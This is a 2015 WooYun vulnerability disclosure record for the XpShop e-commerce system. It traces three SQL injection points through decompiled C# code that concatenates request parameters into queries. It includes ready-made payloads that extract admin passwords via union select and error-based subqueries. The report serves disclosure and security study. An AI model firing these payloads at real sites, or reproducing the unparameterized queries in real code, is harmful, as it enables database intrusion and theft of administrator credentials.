{"id": 83796, "wybug_id": "wooyun-2015-0146746", "wybug_title": "xpshop网店系统sql注入3枚打包", "wybug_corp": "xpshop", "wybug_author": "不能忍", "wybug_date": "2015-10-15 10:25", "wybug_open_date": "2015-11-29 10:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-11-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 这是第二发 详细说明：  漏洞位置:XpShop.WebUI.AutoComplete\nprotected void Page_Load(object sender, EventArgs e)\t\t{\t\t\tstring input = this.GetInput();\t\t\tif (input == \"\")\t\t\t{\t\t\t\tbase.Response.Write(Utils.ShowMsg(\"非法调用！\"));\t\t\t}\t\t\telse\t\t\t{\t\t\t\tbase.Response.Write(this.GetProductName(input));\t\t\t\tbase.Response.End();\t\t\t}\t\t}\n跟进这个函数GetProductName：\nprivate string GetProductName(string pname)\t\t{\t\t\tProductDB productDB = new ProductDB();\t\t\treturn productDB.GetProductNameByAjax(pname);\t\t}\n继续跟进GetProductNameByAjax:\npublic string GetProductNameByAjax(string productName)\t\t{\t\t\tstring commandText = \"SELECT Top 15 ProductName FROM Product WHERE ProductName Like '%\" + productName + \"%' ORDER BY Sort DESC\";\t\t\tDataSet dataSet = XpShopDB.ExecuteDataset(XpShopDB.ConnectionString, CommandType.Text, commandText, null);\t\t\treturn dataSet.GetXml();\t\t}\n进库也是没过滤的，搜索型注入。payload：post:pname=test%' union select password from admin--漏洞地址：namespace XpShop.WebUI.AJAX 代码：\nprivate void BindActive()\t\t{\t\t\tif (base.Request.QueryString[\"parent_id\"] != null)\t\t\t{\t\t\t\tthis.BindChild(int.Parse(base.Request.QueryString[\"parent_id\"]));\t\t\t}\t\t\tif (base.Request.QueryString[\"action\"] != null && base.Request.QueryString[\"action\"].ToString() == \"del\")\t\t\t{\t\t\t\tthis.DeleteInstall();\t\t\t}\t\t\tif (base.Request.QueryString[\"type\"] != null)\t\t\t{\t\t\t\tstring text = base.Request.QueryString[\"type\"];\t\t\t\tif (text != null)\t\t\t\t{\t\t\t\t\tif (<PrivateImplementationDetails>{1D6FAB71-A022-4740-999F-97750306A650}.$$method0x6000444-1 == null)\t\t\t\t\t{\t\t\t\t\t\t<PrivateImplementationDetails>{1D6FAB71-A022-4740-999F-97750306A650}.$$method0x6000444-1 = new Dictionary<string, int>(32)\t\t\t\t\t\t{\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetResourceString\",\t\t\t\t\t\t\t\t0\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetShippings\",\t\t\t\t\t\t\t\t1\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetAddress\",\t\t\t\t\t\t\t\t2\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetAreaIDByName\",\t\t\t\t\t\t\t\t3\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetShippingName\",\t\t\t\t\t\t\t\t4\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetMemmberMaxAddressCount\",\t\t\t\t\t\t\t\t5\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetProductStatus\",\t\t\t\t\t\t\t\t6\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetPreNextProductID\",\t\t\t\t\t\t\t\t7\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetIsShopStop\",\t\t\t\t\t\t\t\t8\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetMemberFavCat\",\t\t\t\t\t\t\t\t9\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"AddToFav\",\t\t\t\t\t\t\t\t10\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"UserLoginStatus\",\t\t\t\t\t\t\t\t11\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetProductStatusByID\",\t\t\t\t\t\t\t\t12\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"AddStockReg\",\t\t\t\t\t\t\t\t13\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"CheckCoupons\",\t\t\t\t\t\t\t\t14\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"AddShoppingCartCoupons\",\t\t\t\t\t\t\t\t15\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"BindCoupons\",\t\t\t\t\t\t\t\t16\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetNowPrice\",\t\t\t\t\t\t\t\t17\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"DeleteFavPdt\",\t\t\t\t\t\t\t\t18\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"UpdatePayment\",\t\t\t\t\t\t\t\t19\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"AddNewFavCat\",\t\t\t\t\t\t\t\t20\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"EditFavCat\",\t\t\t\t\t\t\t\t21\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"DelFavCat\",\t\t\t\t\t\t\t\t22\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetCurrentMemberID\",\t\t\t\t\t\t\t\t23\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetCombineOrders\",\t\t\t\t\t\t\t\t24\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetSubArea\",\t\t\t\t\t\t\t\t25\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetStorage\",\t\t\t\t\t\t\t\t26\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"UpdateCartNum\",\t\t\t\t\t\t\t\t27\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"GetReceiveAddress\",\t\t\t\t\t\t\t\t28\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"ConfirmReceived\",\t\t\t\t\t\t\t\t29\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"ChangeScore\",\t\t\t\t\t\t\t\t30\t\t\t\t\t\t\t},\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\"CheckGiftStatus\",\t\t\t\t\t\t\t\t31\t\t\t\t\t\t\t}\t\t\t\t\t\t};\t\t\t\t\t}\t\t\t\t\tint num;\t\t\t\t\tif (<PrivateImplementationDetails>{1D6FAB71-A022-4740-999F-97750306A650}.$$method0x6000444-1.TryGetValue(text, out num))\t\t\t\t\t{\t\t\t\t\t\tswitch (num)\t\t\t\t\t\t{\t\t\t\t\t\tcase 0:\t\t\t\t\t\t\tbase.Response.Write(base.GetResourceString(base.Request.QueryString[\"str\"]));\t\t\t\t\t\t\tbase.Response.End();\t\t\t\t\t\t\tgoto IL_7CF;\t\t\t\t\t\tcase 1:\t\t\t\t\t\t{\t\t\t\t\t\t\tstring s = this.GetShippings(int.Parse(base.Request.QueryString[\"areaID\"]));\t\t\t\t\t\t\tbase.Response.Write(s);\t\t\t\t\t\t\tbase.Response.End();\t\t\t\t\t\t\tgoto IL_7CF;\t\t\t\t\t\t}\t\t\t\t\t\tcase 2:\t\t\t\t\t\t\tthis.GetAddress(int.Parse(base.Request.QueryString[\"said\"]));\t\t\t\t\t\t\tgoto IL_7CF;\t\t\t\t\t\tcase 3:\t\t\t\t\t\t\tthis.GetAreaIDByName(base.Request.QueryString[\"AreaName\"]);//第一处\t\t\t\t\t\t\tgoto IL_7CF;\t\t\t\t\t\tcase 4:\t\t\t\t\t\t\tthis.GetShippingName(base.Request.QueryString[\"ShippingID\"]);\t\t\t\t\t\t\tgoto IL_7CF;\t\t\t\t\t\tcase 5:\t\t\t\t\t\t\tthis.GetMemmberMaxAddressCount();\t\t\t\t\t\t\tgoto IL_7CF;\t\t\t\t\t\tcase 6:\t\t\t\t\t\t\tthis.GetProductStatus();//第二处\n跟进第一处函数GetAreaIDByName：\nprivate void GetAreaIDByName(string areaName)\t\t{\t\t\tbase.Response.Write(new ShippingAreaDB().GetAreaIDByName(areaName));\t\t\tbase.Response.End();\t\t}\n继续跟进函数GetAreaIDByName：\npublic string GetAreaIDByName(string areaName)\t\t{\t\t\tstring result = \"0\";\t\t\tstring cmdText = \"SELECT ShippingAreaID FROM ShippingArea WHERE [Name] = '\" + areaName + \"'\";//进库\t\t\tobject obj = XpShopDB.ExecuteScalar(XpShopDB.ConnectionString, CommandType.Text, cmdText, null);\t\t\tif (obj != null)\t\t\t{\t\t\t\tresult = obj.ToString();\t\t\t}\t\t\telse\t\t\t{\t\t\t\tcmdText = \"SELECT ShippingAreaID FROM ShippingArea WHERE [Name] LIKE '%\" + areaName + \"%'\";//进库\t\t\t\tobject obj2 = XpShopDB.ExecuteScalar(XpShopDB.ConnectionString, CommandType.Text, cmdText, null);\t\t\t\tif (obj2 != null)\t\t\t\t{\t\t\t\t\tresult = obj2.ToString();\t\t\t\t}\t\t\t}\t\t\treturn result;\t\t}\n这两处都是进库，而且都是没有过滤的。再来看看第二个函数GetProductStatus:\nprivate void GetProductStatus()\t\t{\t\t\tstring text = \"\";\t\t\tstring text2 = base.Request.QueryString[\"ProductNos\"];\t\t\tstring[] array = text2.Split(new char[]\t\t\t{\t\t\t\t','\t\t\t});\t\t\tProductDB productDB = new ProductDB();\t\t\tConfigDetails systemConfig = new ConfigDB().GetSystemConfig();\t\t\tfor (int i = 0; i < array.Length; i++)\t\t\t{\t\t\t\tarray[i] = array[i].Trim();\t\t\t\tSqlDataReader productStatusByNo = productDB.GetProductStatusByNo(array[i]);\n继续跟进函数GetProductStatusByNo：\npublic SqlDataReader GetProductStatusByNo(string productNo)\t\t{\t\t\tstring cmdText = string.Concat(new string[]\t\t\t{\t\t\t\t\"SELECT Status,\",\t\t\t\tUtils.dbo,\t\t\t\t\"f_getstorage(productid) As Storage,IsForSale FROM Product WHERE ProductNo = '\",\t\t\t\tproductNo,\t\t\t\t\"'\"\t\t\t});\t\t\treturn XpShopDB.ExecuteReader(XpShopDB.ConnectionString, CommandType.Text, cmdText, null);\t\t}\n这里也是没有过滤的，但是有个问题：\t\t\tstring[] array = text2.Split(new char[]\t\t\t{\t\t\t\t','\t\t\t});这里把传过来的值作,分割了，而且所使用的表select了三个字段，所以就没有办法用union注入了（反正我是没办法，大牛们就不知道了）然后遍历进库：SqlDataReader productStatusByNo = productDB.GetProductStatusByNo(array[i]);于是我换了一个办法，就不用,了给出两个payload：http://localhost/ajax.aspx?type=GetAreaIDByName&AreaName=test' union select password from admin--http://localhost/ajax.aspx?type=GetProductStatus&ProductNos=test' and 1=(select top 1 password from admin)--   漏洞证明：  http://**.**.**.**//AutoComplete.aspxpname=test%' union select password from admin--\n\nhttp://localhost/ajax.aspx?type=GetAreaIDByName&AreaName=test' union select password from admin--\n\nhttp://localhost/ajax.aspx?type=GetProductStatus&ProductNos=test' and 1=(select top 1 password from admin)--\n\n   修复方案：  过滤   版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}